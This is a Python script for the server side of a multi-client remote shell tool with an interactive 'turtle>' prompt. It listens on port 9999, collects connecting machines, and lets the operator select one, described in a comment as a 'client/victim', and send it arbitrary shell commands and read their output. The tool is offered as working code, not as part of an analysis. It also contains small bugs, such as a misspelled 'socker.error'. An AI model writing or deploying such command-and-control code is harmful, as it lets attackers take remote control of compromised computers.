import socket
import sys
import threading
import time
from queue import Queue


NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_address = []


#  Create a socket (connect to computers) 
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("--------------- Socket creation error: {0:s}".format(str(msg)))


# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s
        
        print("-------------- Binding the port {0:d}".format(int(port)))
        
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("--------------- Socket binding error: {0:s}\n Retrying .....".format(str(msg)))
        bind_socket()


# Handling connection from a multiple clients and saving to a list
# Closing previous connections when server.py file restarted
def accepting_connections():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_address[:]
    while True:
        try:
            connection, address = s.accept()
            s.setblocking(1) # Prevents timeout
            all_connections.append(connection)
            all_address.append(address)
            print("Connection has been establish!\nIP {0:s}".format(str(address[0])))
        except socket.error as msg:
            print("Error accepting connection")


# 2nd thread functions - 1) See all the clients, 2) Select a client, 3) Send commands to the connected clients
# Interactive prompt for sending commands
# turtle> list
# 0 Friend-A Port
# 1 Friend-B Port
# 2 Friend-C Port
# turtle> select 1
# 192.168.0.112> dir
def start_turtle():
    while True:
        cmd = input('turtle> ')
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            connection = get_target(cmd)
            if connection is not None:
                send_target_commands(connection)
        else:
            print("Command not recognized")


# Display all current active connections with the client
def list_connections():
    results = ''
    for i, c in enumerate(all_connections):
        try:
            c.send(str.encode(' '))
            c.recv(201480)
        except socket.error as msg:
            del all_connections[i]
            del all_address[i]
            continue
        results = results + str(i) + " " + str(all_address[i][0]) + " " + str(all_address[i][1]) + "\n"
    print("-------------------- Clients -------------------\n" + results)


# Selecting the target
def get_target(cmd):
    try:
        target = int(cmd.replace('select ', '')) # target = id
        connection = all_connections[target]
        print("You are now connected to {0:s}".format(str(all_address[target][0])))
        print(str(all_address[target][0]) + "> ", end="")
        return connection 
    except socket.error as msg:
        print("Selection not valid")
        return None


# Send commands to client/victim or a friend
def send_target_commands(connection):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break
            if len(str.encode(cmd)) > 0:
                connection.send(str.encode(cmd))
                client_response = str(connection.recv(20480), 'utf-8')
                print(client_response, end='')
        except socker.error as msg:
            print("Error sending commands")
            break 


# Create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True 
        t.start()


# Do next job that is in the queue (handler connections, send commands)
def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connections()
        elif x == 2:
            start_turtle()
        queue.task_done()


def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()


create_workers()
create_jobs()
